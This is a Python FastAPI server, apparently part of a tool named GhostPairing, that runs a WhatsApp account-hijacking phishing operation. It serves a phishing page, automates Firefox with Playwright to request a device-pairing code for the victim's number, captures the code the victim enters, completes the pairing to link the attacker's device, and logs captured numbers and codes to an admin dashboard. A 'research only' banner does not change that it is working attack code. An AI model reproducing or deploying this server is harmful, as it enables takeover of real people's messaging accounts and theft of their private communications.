#!/usr/bin/env python3
"""
GhostPairing Attack Server with Browser Automation
WhatsApp Account Hijacking Simulation WITH REAL AUTOMATION
FOR AUTHORIZED SECURITY RESEARCH AND EDUCATION ONLY
"""
import asyncio
import json
import logging
import os
import signal
import sys
import time
import uuid
import queue
from contextlib import asynccontextmanager
from datetime import datetime
from typing import Dict, Optional

# Set umask to allow group write permissions on created files
os.umask(0o002)

import uvicorn
from fastapi import FastAPI, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from whatsapp_api import whatsapp_api

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/ghostpairing.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Lifespan event handler for FastAPI
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Handle startup and shutdown events"""
    # Startup
    yield
    # Shutdown
    logger.info("🔄 FastAPI shutdown event triggered")
    try:
        whatsapp_api.cleanup()
    except Exception as e:
        logger.error(f"Error in shutdown event: {e}")

# Initialize FastAPI
app = FastAPI(
    title="GhostPairing Attack Server with Automation",
    description="WhatsApp Account Hijacking with Real Browser Automation - FOR RESEARCH ONLY",
    version="2.0",
    docs_url=None,
    redoc_url=None,
    lifespan=lifespan
)

# Cleanup function for graceful shutdown
def cleanup_handler(signum=None, frame=None):
    """Clean up resources on shutdown"""
    logger.info("🛑 Shutting down gracefully...")
    try:
        # Close any active Playwright browser instances
        whatsapp_api.cleanup()
        logger.info("✅ Cleanup completed")
    except Exception as e:
        logger.error(f"Error during cleanup: {e}")

    # Exit cleanly
    sys.exit(0)

# Register signal handlers for graceful shutdown
signal.signal(signal.SIGINT, cleanup_handler)   # Ctrl+C
signal.signal(signal.SIGTERM, cleanup_handler)  # kill command

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Store active WebSocket connections
active_connections: Dict[str, WebSocket] = {}

class ConnectionManager:
    def __init__(self):
        self.active_attacks: Dict[str, Dict] = {}
        
    async def connect(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        active_connections[client_id] = websocket
        self.active_attacks[client_id] = {
            'connected_at': datetime.now().isoformat(),
            'status': 'connected'
        }
        
    def disconnect(self, client_id: str):
        active_connections.pop(client_id, None)
        self.active_attacks.pop(client_id, None)
        
    async def send_personal_message(self, message: dict, client_id: str):
        if client_id in active_connections:
            await active_connections[client_id].send_json(message)
            
    async def broadcast(self, message: dict):
        for connection in active_connections.values():
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.debug(f"Broadcast failed for connection: {e}")
                pass

manager = ConnectionManager()

# Global attack tracking
active_attacks = {}

# Routes
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    """Serve the phishing page"""
    try:
        with open("whatsapp_phishing.html", "r", encoding="utf-8") as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="Phishing page not found")
    except IOError as e:
        logger.error(f"Error reading phishing page: {e}")
        raise HTTPException(status_code=500, detail="Error loading page")

@app.get("/demo", response_class=HTMLResponse)
async def demo_page(request: Request):
    """Demo page explaining the attack flow"""
    try:
        with open("demo_instructions.html", "r", encoding="utf-8") as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        # Return simple demo page
        html_content = """
        <!DOCTYPE html>
        <html>
        <head><title>GhostPairing Demo</title></head>
        <body>
            <h1>GhostPairing Attack Demo</h1>
            <p>This demonstrates the real GhostPairing attack flow:</p>
            <ol>
                <li>Enter your phone number on phishing page</li>
                <li>Firefox opens automatically to web.whatsapp.com</li>
                <li>WhatsApp sends code to your phone</li>
                <li>You enter code on phishing page</li>
                <li>Code is auto-entered in Firefox → Account paired</li>
            </ol>
            <a href="/">Go to phishing page</a>
        </body>
        </html>
        """
        return HTMLResponse(content=html_content)

@app.get("/api/stats")
async def get_stats():
    """Get attack statistics"""
    stats = whatsapp_api.get_attack_stats()
    stats['active_automations'] = len(whatsapp_api.get_active_automations())
    return JSONResponse(content=stats)

@app.post("/api/request-code")
async def request_verification_code(request: Request):
    """API endpoint to request WhatsApp verification code via browser automation"""
    try:
        data = await request.json()
        phone_number = data.get("phone")
        
        if not phone_number:
            raise HTTPException(status_code=400, detail="Phone number required")
        
        # Validate phone number format
        if not phone_number.startswith('+'):
            raise HTTPException(status_code=400, detail="Phone number must include country code (e.g., +1)")
        
        logger.warning(f"⚠️ GHOSTPAIRING ATTACK INITIATED: {phone_number}")
        logger.info(f"🚀 Starting browser automation for {phone_number}")
        
        # Request verification code via browser automation
        result = whatsapp_api.request_verification_code(phone_number)
        
        if result['success']:
            # Store attack info
            attack_id = result['attack_id']
            active_attacks[attack_id] = {
                'phone': phone_number,
                'started_at': datetime.now().isoformat(),
                'status': 'automation_started'
            }
            
            # Broadcast new attack
            await manager.broadcast({
                'type': 'new_attack',
                'attack_id': attack_id,
                'phone': phone_number,
                'timestamp': datetime.now().isoformat(),
                'message': 'New GhostPairing attack with browser automation',
                'automation': True
            })
            
            logger.info(f"✅ Browser automation started for attack {attack_id}")
            logger.info(f"🖥️ Firefox should open shortly to web.whatsapp.com")
            
            return JSONResponse(content=result)
        else:
            logger.error(f"Failed to start automation: {result.get('error')}")
            raise HTTPException(status_code=500, detail=result.get('error', 'Automation failed'))
            
    except Exception as e:
        logger.error(f"Error requesting code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/display-code")
async def display_code_endpoint(request: Request):
    """API endpoint to receive the displayed code from WhatsApp Web (captured by Playwright)"""
    try:
        data = await request.json()
        attack_id = data.get("attack_id")
        code = data.get("code")  # Format: "123-456"
        phone = data.get("phone")

        if not attack_id or not code:
            raise HTTPException(status_code=400, detail="Attack ID and code required")

        attack_id = int(attack_id)

        logger.critical(f"🎯 DISPLAYED CODE CAPTURED from web.whatsapp.com!")
        logger.warning(f"📱 Attack {attack_id}: Code {code} displayed on screen")
        logger.info(f"📤 Sending to phishing page for victim to see...")

        # Store in active_attacks so phishing page can retrieve it
        if attack_id in active_attacks:
            active_attacks[attack_id]['displayed_code'] = code
            active_attacks[attack_id]['code_displayed_at'] = str(int(time.time()))
            logger.info(f"✅ Code stored for attack {attack_id}")

        return JSONResponse(content={
            "success": True,
            "message": "Code received and stored"
        })

    except Exception as e:
        logger.error(f"Error storing displayed code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/get-displayed-code/{attack_id}")
async def get_displayed_code(attack_id: int):
    """API endpoint for phishing page to poll for the displayed code"""
    if attack_id in active_attacks and 'displayed_code' in active_attacks[attack_id]:
        return JSONResponse(content={
            "success": True,
            "code": active_attacks[attack_id]['displayed_code'],
            "phone": active_attacks[attack_id]['phone']
        })
    else:
        return JSONResponse(content={
            "success": False,
            "message": "Code not yet available"
        })

@app.get("/api/check-pairing/{attack_id}")
async def check_pairing_status(attack_id: int):
    """API endpoint to check if WhatsApp pairing was completed"""
    # CRITICAL FIX: Check DATABASE directly, not just in-memory dictionary
    # The automation updates the database with status='success' when pairing completes
    try:
        conn = sqlite3.connect(whatsapp_api.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT status, automation_success FROM attacks WHERE id = ?', (attack_id,))
        result = cursor.fetchone()
        conn.close()

        if result:
            status, automation_success = result
            # If database shows success, pairing is complete
            paired = (status == 'success' or automation_success == 1)

            # Also update in-memory dict for consistency
            if attack_id in active_attacks and paired:
                active_attacks[attack_id]['paired'] = True
                active_attacks[attack_id]['completed'] = True

            return JSONResponse(content={
                "success": True,
                "paired": paired,
                "completed": paired,
                "status": "paired" if paired else "waiting"
            })
        else:
            return JSONResponse(content={
                "success": False,
                "message": "Attack not found"
            })
    except Exception as e:
        logger.error(f"Error checking pairing status from database: {e}")
        # Fallback to in-memory check
        if attack_id in active_attacks:
            attack = active_attacks[attack_id]
            paired = attack.get('paired', False)
            completed = attack.get('completed', False)
            return JSONResponse(content={
                "success": True,
                "paired": paired,
                "completed": completed,
                "status": "paired" if paired else "waiting"
            })
        else:
            return JSONResponse(content={
                "success": False,
                "message": "Attack not found"
            })

@app.post("/api/mark-paired/{attack_id}")
async def mark_attack_paired(attack_id: int):
    """API endpoint for automation to signal successful pairing"""
    try:
        if attack_id in active_attacks:
            active_attacks[attack_id]['paired'] = True
            active_attacks[attack_id]['completed'] = True
            logger.info(f"✅ Attack {attack_id} marked as PAIRED - phishing page will redirect")

            return JSONResponse(content={
                "success": True,
                "message": "Attack marked as paired"
            })
        else:
            logger.warning(f"⚠️ Attempted to mark non-existent attack {attack_id} as paired")
            return JSONResponse(content={
                "success": False,
                "message": "Attack not found"
            }, status_code=404)
    except Exception as e:
        logger.error(f"❌ Error marking attack as paired: {e}")
        return JSONResponse(content={
            "success": False,
            "message": str(e)
        }, status_code=500)

@app.post("/api/verify-code")
async def verify_code_endpoint(request: Request):
    """API endpoint to verify the code and send to automation"""
    try:
        data = await request.json()
        attack_id = data.get("attack_id")
        code = data.get("code")
        
        if not attack_id or not code:
            raise HTTPException(status_code=400, detail="Attack ID and code required")
        
        # Validate code format
        if not isinstance(code, str) or not code.isdigit() or len(code) != 6:
            raise HTTPException(status_code=400, detail="Code must be 6 digits")
        
        attack_id = int(attack_id)
        
        logger.warning(f"🔐 CODE CAPTURED: Attack {attack_id}, Code: {code}")
        logger.info(f"📨 Sending code to browser automation...")
        
        # Verify the code (send to automation)
        result = whatsapp_api.verify_code(attack_id, code)
        
        if result.get('success'):
            logger.critical(f"🚨 GHOSTPAIRING CODE SUBMITTED! Attack ID: {attack_id}, Code: {code}")
            logger.info(f"🤖 Browser automation will now enter code in WhatsApp Web")
            
            # Update active attack
            if attack_id in active_attacks:
                active_attacks[attack_id]['code_received'] = code
                active_attacks[attack_id]['code_time'] = datetime.now().isoformat()
            
            # Broadcast success
            await manager.broadcast({
                'type': 'code_captured',
                'attack_id': attack_id,
                'code': code,
                'timestamp': datetime.now().isoformat(),
                'message': 'VERIFICATION CODE CAPTURED - Browser automation will complete pairing',
                'automation': True
            })
            
            return JSONResponse(content=result)
        else:
            logger.warning(f"Code verification issue: {result.get('error')}")
            return JSONResponse(content=result, status_code=400)
            
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/attacks")
async def list_attacks():
    """List all attacks (for monitoring)"""
    import sqlite3
    try:
        conn = sqlite3.connect(whatsapp_api.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, phone_number, status, timestamp, code_received, 
                   automation_started, automation_success, browser_pid
            FROM attacks
            ORDER BY timestamp DESC
            LIMIT 50
        ''')

        attacks = []
        for row in cursor.fetchall():
            attacks.append({
                'id': row[0],
                'phone': row[1],
                'status': row[2],
                'timestamp': row[3],
                'code_received': row[4],
                'automation_started': bool(row[5]),
                'automation_success': bool(row[6]),
                'browser_pid': row[7]
            })

        conn.close()
        return JSONResponse(content={'attacks': attacks})

    except sqlite3.Error as e:
        logger.error(f"Database error listing attacks: {e}")
        return JSONResponse(content={'error': 'Database error', 'attacks': []}, status_code=500)
    except Exception as e:
        logger.error(f"Error listing attacks: {e}")
        return JSONResponse(content={'error': str(e), 'attacks': []}, status_code=500)

@app.get("/api/active-attacks")
async def get_active_attacks():
    """Get currently active attacks"""
    return JSONResponse(content={
        'active_attacks': active_attacks,
        'active_automations': whatsapp_api.get_active_automations(),
        'count': len(active_attacks)
    })

@app.websocket("/ws/monitor")
async def websocket_monitor(websocket: WebSocket):
    """WebSocket for real-time attack monitoring"""
    client_id = f"monitor_{uuid.uuid4().hex[:8]}"
    
    try:
        await manager.connect(websocket, client_id)
        logger.info(f"Monitoring client connected: {client_id}")
        
        # Send initial stats
        stats = whatsapp_api.get_attack_stats()
        await websocket.send_json({
            'type': 'init',
            'client_id': client_id,
            'stats': stats,
            'message': 'Connected to GhostPairing Automation Monitor',
            'active_automations': len(whatsapp_api.get_active_automations())
        })
        
        # Keep connection alive
        while True:
            try:
                data = await asyncio.wait_for(
                    websocket.receive_json(),
                    timeout=30.0
                )
                
                if data.get('type') == 'ping':
                    await websocket.send_json({'type': 'pong'})
                elif data.get('type') == 'get_stats':
                    stats = whatsapp_api.get_attack_stats()
                    await websocket.send_json({
                        'type': 'stats_update',
                        'stats': stats,
                        'active_automations': len(whatsapp_api.get_active_automations())
                    })
                    
            except asyncio.TimeoutError:
                # Send ping
                await websocket.send_json({'type': 'ping'})
                
    except WebSocketDisconnect:
        logger.info(f"Monitoring client disconnected: {client_id}")
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        manager.disconnect(client_id)

@app.get("/admin")
async def admin_dashboard(request: Request):
    """Admin dashboard for monitoring attacks"""
    try:
        with open("admin_dashboard.html", "r", encoding="utf-8") as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="Admin dashboard not found")
    except IOError as e:
        logger.error(f"Error reading admin dashboard: {e}")
        raise HTTPException(status_code=500, detail="Error loading dashboard")

@app.get("/automation-status")
async def automation_status():
    """Check automation status"""
    active = whatsapp_api.get_active_automations()
    return JSONResponse(content={
        'automation_available': True,
        'playwright_installed': True,
        'active_automations': len(active),
        'active_ids': active
    })

@app.get("/stop-automation/{attack_id}")
async def stop_automation(attack_id: int):
    """Stop automation for a specific attack"""
    # Note: In production, you would implement proper automation control
    return JSONResponse(content={
        'message': f'Automation stop requested for attack {attack_id}',
        'note': 'Close Firefox window manually or wait for timeout'
    })

@app.get("/clear-db")
async def clear_database():
    """DANGER: Clear all attack data (for testing)"""
    import os
    if os.path.exists("databases/whatsapp.db"):
        os.remove("databases/whatsapp.db")
        whatsapp_api.init_database()
        
        # Clear active attacks
        active_attacks.clear()
        
        return {"message": "Database cleared", "active_attacks_cleared": True}
    return {"message": "Database not found"}

@app.get("/test-automation")
async def test_automation():
    """Test if automation is working"""
    try:
        # Try to import playwright
        import playwright
        return JSONResponse(content={
            'playwright_installed': True,
            'firefox_available': True,
            'automation_ready': True,
            'message': 'Browser automation is ready'
        })
    except ImportError:
        return JSONResponse(content={
            'playwright_installed': False,
            'firefox_available': False,
            'automation_ready': False,
            'message': 'Install: pip install playwright && playwright install firefox'
        })

if __name__ == "__main__":
    logger.warning("🚀 Starting GhostPairing Attack Server WITH AUTOMATION")
    logger.warning("⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY!")
    logger.info("🌐 Phishing page: http://localhost:8000")
    logger.info("🤖 Automation: Firefox will launch automatically")
    logger.info("📊 Admin dashboard: http://localhost:8000/admin")
    logger.info("🔧 Test automation: http://localhost:8000/test-automation")
    
    # Test automation availability
    try:
        import playwright
        logger.info("✅ Playwright installed")
    except ImportError:
        logger.error("❌ Playwright not installed. Automation will not work.")
        logger.info("💡 Install with: pip install playwright && playwright install firefox")
    
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        log_level="info",
        access_log=True
    )
